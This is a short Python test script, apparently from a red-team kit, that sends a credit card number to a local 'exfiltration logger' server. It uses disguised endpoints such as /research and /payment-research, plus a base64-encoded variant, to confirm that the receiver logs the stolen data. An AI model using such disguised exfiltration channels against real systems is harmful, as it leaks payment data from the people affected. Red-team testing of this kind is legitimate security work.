#!/usr/bin/env python3
"""
Test script to verify exfiltration logger is working
Run this after starting the exfiltration_logger.py server
"""

import requests
import json
import time

# Test credit card number
CC_NUMBER = "4251 3724 0095 5572"

BASE_URL = "http://localhost:5000"

def test_endpoint(endpoint, params=None):
    """Test an endpoint and print results"""
    url = f"{BASE_URL}{endpoint}"
    print(f"\n{'='*80}")
    print(f"Testing: {url}")
    if params:
        print(f"Params: {params}")
    print(f"{'='*80}")
    
    try:
        response = requests.get(url, params=params, timeout=5)
        print(f"Status: {response.status_code}")
        print(f"Response: {response.json()}")
        return True
    except requests.exceptions.ConnectionError:
        print("ERROR: Could not connect to server. Is it running?")
        return False
    except Exception as e:
        print(f"ERROR: {e}")
        return False

def main():
    print("Exfiltration Logger Test Script")
    print("="*80)
    print(f"Testing credit card number: {CC_NUMBER}")
    print("Make sure the server is running: python3 redteam_kit/examples/exfiltration_logger.py")
    print()
    
    # Test 1: Direct query parameter
    print("\n[TEST 1] Direct query parameter")
    test_endpoint("/research", {"card": CC_NUMBER, "type": "visa"})
    
    time.sleep(1)
    
    # Test 2: API endpoint
    print("\n[TEST 2] API endpoint")
    test_endpoint("/api/log", {"card": CC_NUMBER, "format": "json"})
    
    time.sleep(1)
    
    # Test 3: Payment research
    print("\n[TEST 3] Payment research endpoint")
    test_endpoint("/payment-research", {"q": CC_NUMBER, "source": "test"})
    
    time.sleep(1)
    
    # Test 4: Base64 encoded
    import base64
    encoded = base64.b64encode(CC_NUMBER.encode()).decode()
    print("\n[TEST 4] Base64 encoded")
    test_endpoint("/docs", {"data": encoded, "format": "base64"})
    
    print("\n" + "="*80)
    print("Tests complete!")
    print("Check logs:")
    print("  - redteam_kit/logs/exfiltration_log.json")
    print("  - redteam_kit/logs/access_log.txt")
    print("="*80)

if __name__ == "__main__":
    main()


